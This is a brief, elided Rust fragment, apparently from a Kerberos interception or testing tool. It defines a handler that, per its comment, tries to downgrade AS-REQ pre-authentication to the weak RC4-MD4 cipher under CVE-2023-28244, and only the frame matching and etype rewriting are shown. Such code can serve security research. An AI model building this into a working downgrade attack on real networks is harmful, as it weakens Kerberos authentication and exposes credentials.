use kile::{
    constants::{ETYPE_AES128_CTS_HMAC_SHA1_96, ETYPE_RC4_MD4},
...
/// Handler that attempts to downgrade AS-REQ preauth to RC4-MD4 cipher per CVE-2023-28244
#[derive(Clone, Copy)]
...
impl Default for Cve202328244Handler {
    fn default() -> Self {
        Self {}
    }
}
        ...
        match &frame {
            KdcFrame::AsReq(as_req) => match as_req.get_pa_etype() {
                ...
                Some(ETYPE_RC4_MD4) => {
                    ...
                    let as_req = as_req.clone().replace_etypes(ETYPE_AES128_CTS_HMAC_SHA1_96);
